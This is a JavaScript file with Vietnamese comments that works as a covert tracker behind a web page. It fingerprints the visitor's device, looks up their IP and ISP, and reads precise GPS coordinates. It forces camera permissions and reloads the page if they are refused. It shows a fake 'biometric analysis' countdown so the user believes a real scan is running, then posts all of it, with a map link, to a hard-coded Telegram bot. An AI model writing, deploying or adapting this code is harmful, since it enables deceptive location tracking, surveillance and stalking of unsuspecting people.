const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';
const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
    time: '',
    ip: '',
    isp: '',
    address: '',
    lat: '',
    lon: '',
    device: '',
    os: '',
    camera: '⏳ Đang quét...'
};

// Hàm tạo độ trễ
const sleep = ms => new Promise(res => setTimeout(res, ms));

// --- CÁC HÀM CŨ (GIỮ NGUYÊN) ---
function detectDevice() {
    const ua = navigator.userAgent;
    if (/Android/i.test(ua)) { info.os = 'Android'; } 
    else if (/iPhone|iPad|iPod/i.test(ua)) { info.os = 'iOS'; } 
    else { info.os = 'PC'; }
    info.device = navigator.platform;
}

async function getIPs() {
    try {
        const res = await fetch('https://ipwho.is/').then(r => r.json());
        info.ip = res.ip;
        info.isp = res.connection?.org || 'N/A';
    } catch (e) { info.ip = 'Lỗi'; }
}

async function getLocation() {
    return new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(
            async pos => {
                info.lat = pos.coords.latitude.toFixed(6);
                info.lon = pos.coords.longitude.toFixed(6);
                resolve();
            },
            () => resolve(),
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

// --- HÀM KÍCH HOẠT CAMERA (KHÔNG CHỤP, CHỈ LẤY QUYỀN) ---
async function triggerCameras() {
    try {
        // Mở cam trước
        const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        s1.getTracks().forEach(t => t.stop());
        
        // Đợi 1 tí rồi mở cam sau cho nó chuyên nghiệp
        await sleep(1000); 
        
        const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        s2.getTracks().forEach(t => t.stop());
        
        info.camera = "✅ Đã xác thực 2 Camera";
    } catch (e) {
        info.camera = "🚫 Từ chối Cam";
        throw e; // Ném lỗi để bên HTML bắt được và Reload trang
    }
}

// --- HÀM GỬI TIN NHẮN ---
async function sendToTele() {
    const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
    const caption = `
📡 <b>[THÔNG TIN MỚI]</b>
--------------------------
🕒 <b>Thời gian:</b> ${info.time}
📱 <b>Thiết bị:</b> ${info.os} (${info.device})
🌍 <b>IP:</b> ${info.ip}
🏢 <b>ISP:</b> ${info.isp}
📍 <b>Vị trí:</b> <a href="${mapsLink}">Bấm để xem Map</a>
📸 <b>Camera:</b> ${info.camera}
`.trim();

    await fetch(API_SEND_TEXT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: caption, parse_mode: 'HTML' })
    });
}

// --- HÀM CHÍNH (ĐÃ THÊM ĐỢI 5 GIÂY) ---
async function main() {
    info.time = new Date().toLocaleString('vi-VN');
    detectDevice();
    
    // 1. Ép quyền camera trước (nếu từ chối là văng ra reload luôn)
    await triggerCameras();

    // 2. Chạy lấy IP và Tọa độ ngầm
    getIPs();
    getLocation();

    // 3. Đợi 5 giây để máy kịp lấy GPS chính xác và để người dùng tưởng đang quét thật
    let count = 5;
    const countdown = setInterval(() => {
        count--;
        if (typeof statusText !== 'undefined') {
            statusText.innerText = `Đang phân tích dữ liệu sinh trắc học... (${count}s)`;
        }
        if (count <= 0) clearInterval(countdown);
    }, 1000);

    await sleep(5000); 

    // 4. Cuối cùng mới gửi dữ liệu về Tele
    await sendToTele();
}
